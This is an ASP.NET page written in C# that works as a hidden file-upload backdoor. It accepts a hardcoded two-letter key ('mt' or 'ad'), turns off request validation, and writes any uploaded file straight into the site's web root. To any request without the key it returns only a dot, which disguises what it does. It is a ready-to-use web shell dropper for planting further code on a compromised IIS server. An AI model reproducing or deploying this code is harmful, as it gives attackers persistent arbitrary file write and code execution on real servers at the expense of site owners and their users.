<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ Import Namespace="System.Security"%>

<script runat="server">
    private const string AUTHKEY1 = "mt";
    private const string AUTHKEY2 = "ad";

    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            if (Request.Params["authkey"] == null)
            {
                Response.Write(GetUploadControls());
                return;
            }

            string authkey = Request.Params["authkey"];

            if (authkey != AUTHKEY1 && authkey != AUTHKEY2)
            {
                Response.Write(GetUploadControls());
                return;
            }
            
            if (Request.Params["mt"] != null)
            {
                if (Request.Params["mt"] == "up")
                {
                    Response.Write(UploadFile(authkey));
                }
                else
                {
                    Response.Write("Unknown operation");
                }
            }
            else
            {
                Response.Write(GetUploadControls());
            }
        }
        catch (Exception ex)
        {
            Response.Write(ex.Message);
        }
    }

    private string UploadFile(string authkey)
    {
        try
        {
            if (Request.Params["authkey"] == null)
            {
                return string.Empty;
            }

            if (authkey != AUTHKEY1 && authkey != AUTHKEY2)
            {
                return string.Empty;
            }
            
            if (Request.Files.Count != 1)
            {
                return "nfs";
            }

            HttpPostedFile httpPostedFile = Request.Files[0];

            int fileLength = httpPostedFile.ContentLength;
            byte[] buffer = new byte[fileLength];
            httpPostedFile.InputStream.Read(buffer, 0, fileLength);

            string uploadDirectory = string.Empty;

if (authkey == AUTHKEY1)
{
    uploadDirectory = Server.MapPath("~/");
}
else if (authkey == AUTHKEY2)
{
    uploadDirectory = Server.MapPath("~/");
}

using (FileStream fileStream = new FileStream(Path.Combine(uploadDirectory, Path.GetFileName(httpPostedFile.FileName)), FileMode.Create))
{
    fileStream.Write(buffer, 0, buffer.Length);
}


            return "up";
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }

    private string GetUploadControls()
    {
        return ".";
    }
</script>
